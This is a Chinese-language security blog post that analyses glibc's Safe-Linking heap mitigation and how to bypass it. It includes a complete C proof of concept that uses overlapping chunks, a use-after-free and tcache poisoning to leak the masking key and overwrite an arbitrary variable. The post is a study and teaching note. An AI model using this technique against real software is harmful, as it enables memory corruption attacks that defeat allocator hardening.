---

layout: post

title: 'Safe-Linking机制分析'

date: '2020-06-04'

header-img: "img/home-bg.jpg"

tags:
     - 学习笔记  
author: 'De4dCr0w'

---

<!-- more -->

### 环境搭建

下载glibc引入Safe-Linking机制版本：

```
git clone git://sourceware.org/git/glibc.git
cd glibc
git checkout 76d5b2f002a1243ddba06bd646249553353f4322
```

编译：

```
cd glibc
mkdir build
cd build
../configure --prefix=/usr/local/glbic/glibc2.31
make
sudo make install
```

指定glibc编译poc代码：

```c
gcc poc.c -o poc -g -Wl,--rpath=/usr/local/glbic/glibc2.31/libc -Wl,--dynamic-linker=/usr/local/glbic/glibc2.31/lib/ld-linux-x86-64.so.2
```

安装pwngdb，之后就可以愉快地调试了。

### Safe-Linking 机制分析

打算从glibc 2.32引入Safe-Linking 保护，将堆块头部保存的地址重新计算，具体计算过程如下：

```c
#define PROTECT_PTR(pos, ptr, type)  \
        ((type)((((size_t)pos) >> PAGE_SHIFT) ^ ((size_t)ptr)))
#define REVEAL_PTR(pos, ptr, type)   \
        PROTECT_PTR(pos, ptr, type)
```

将指针的地址右移PAGE_SHIFT 再和指针本身异或，如下，L为指针的地址，P为指针本身，该操作是可逆的，取指针时再做一次操作就可以还原得到原来的指针：

![img](D:\github\De4dCr0w.github.io\image\2020-06-04-Safe-Linking机制分析\4.png)

上述这种方法相当于对指针进行了随机化，有点想linux 内核下CONFIG_SLAB_FREELIST_HARDENED的缓解机制，CONFIG_SLAB_FREELIST_HARDENED的计算是：

```c
下一个free object的地址 = random ^ 当前free object的地址 ^ 当前free object 原本fd处的值
```

在 kmem_cache 增加了一个unsigned long类型的变量random。

### Safe-Linking 机制绕过

主要就是泄漏L>>12的值，通过构造堆块，使得chunkC被包含在一个大堆块中，有两个指针同时指向chunkC，造成UAF，释放一个chunkC指针到tcache中，此时chunkC为tcache中第一个bin，fd引入补丁前填充的是0，此时因为Safe-Linking，P' = L >> 12 ^ P = L >> 12 ^ 0 = L >> 12。所以fd填充的是L>>12的值，所以通过另一个chunkC指针就可以泄露该值，后续将目标地址和L12异或计算填充到fd，就可以达到任意地址的读写。

以下demo代码最终效果是将arbitrary_variable变量改写成0x112233445566。并且没有Safe-Linking的引入，demo代码也能达到相同效果，因为此时泄露出来的L>>12为0，目标地址和0异或还是正确的地址。

综上所述，要绕过Safe-Linking主要就是泄露L的信息。其实如果能泄露堆的地址其实也可以。

验证代码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

#define SAFE_FREE(p) { free(p); p = NULL; }

char *payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\x01\x00\x00\x00\x00"
                "\x00\x00\xa0";

char *payload2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x41\x01";

uint64_t screw_up_alignment = 0x4a4a4a4a;
uint64_t arbitrary_variable = 0x11111111;

int bypass_demo() {
    void *tcache_allocs[7];

    for( int i = 0; i < 7; i++) {
        tcache_allocs[i] = malloc(0x98);
    }

    char *chunkA = malloc(0x98);
    char *chunkB = malloc(0x98);
    char *chunkC = malloc(0x98);
    char *chunkD = malloc(0xb8);

    for( int i = 0; i < 7; i++) {
        SAFE_FREE(tcache_allocs[i]);
    }

    SAFE_FREE(chunkB);

    memcpy(chunkC, payload, 0x99);

    chunkD[0x98] = '\x21';

    memcpy(chunkA, payload2, 0x9a);

    SAFE_FREE(chunkD);

    for( int i = 0; i < 7; i++) {
        tcache_allocs[i] = malloc(0x98);
    }

    char *junk = malloc(0x98);
    char *chunkC2 = malloc(0x98);

    SAFE_FREE(chunkC2);

    uint64_t L12 = *(int64_t *)chunkC;

    uint64_t masked_ptr = L12 ^ (((uint64_t) &arbitrary_variable) & ~0xf);
    uint64_t *chunkC3 = malloc(0x98);

    SAFE_FREE(tcache_allocs[0]);

    SAFE_FREE(chunkC3);

    *(uint64_t *) chunkC = masked_ptr;
    
    char *junk2 = malloc(0x98);
    uint64_t *winner = malloc(0x98);

    *(winner+1) = 0x112233445566;

    printf("\nArbitrary variable now contains 0x%lx\n", arbitrary_variable);
}

int main() {
    bypass_demo();
    return 0;
    
}
```



### 参考链接：

在uclibc-ng中引入的补丁：https://gogs.waldemar-brodkorb.de/oss/uclibc-ng/commit/886878b22424d6f95bcdeee55ada72049d21547c  就是在取p->fd和存放p->fd时都改成调用REVEAL_PTR

https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/  机制介绍

https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation 机制绕过

 